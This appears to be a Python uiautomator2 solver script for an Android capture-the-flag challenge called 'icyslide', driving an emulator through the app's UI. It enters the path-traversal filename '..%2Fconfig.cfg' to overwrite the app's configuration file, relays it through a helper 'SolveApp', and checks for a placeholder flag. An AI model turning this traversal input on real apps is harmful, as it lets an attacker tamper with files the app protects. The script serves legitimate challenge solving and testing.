import uiautomator2 as u2
import time

device = u2.connect("emulator-5554")

# Function to click a button by its text or resource ID
def click_button(button_text=None, resource_id=None):
    if button_text:
        device(text=button_text).click()
    elif resource_id:
        device(resourceId=resource_id).click()
    else:
        print("No button text or resource ID specified for click action")
    time.sleep(1)  # Wait a second to allow UI to update
    
# Function to enter text into a field by resource ID
def enter_text(resource_id, text):
    device(resourceId=resource_id).set_text(text)
    print(f"Entered text: {text}")
    time.sleep(1)

target_app = "glacier.ctf.icyslide"
solution_app = "solveapp.glacier.icyslide"

device.press("home")
device.app_start(target_app, activity="glacier.ctf.icyslide.MainActivity")
click_button("Create Files")
device(className="android.widget.EditText", instance=0).set_text(r"..%2Fconfig.cfg")
device(className="android.widget.EditText", instance=1).set_text("something else")
click_button("Save File")
device.press("back")
click_button("View Files")
click_button(r"..%2Fconfig.cfg")
click_button(r"Send File")
click_button("SolveApp")
device.app_start(solution_app, activity="solveapp.glacier.icyslide.MainActivity")
click_button("Share File")
click_button("Close")
device.app_start(target_app, activity="glacier.ctf.icyslide.MainActivity")
device.press("back")
device(description="Flag Icon").wait(timeout=10)
device(description="Flag Icon").click()
time.sleep(1)
if device(text="flag{this_is_a_fake_flag}"):
    print("wahoo")
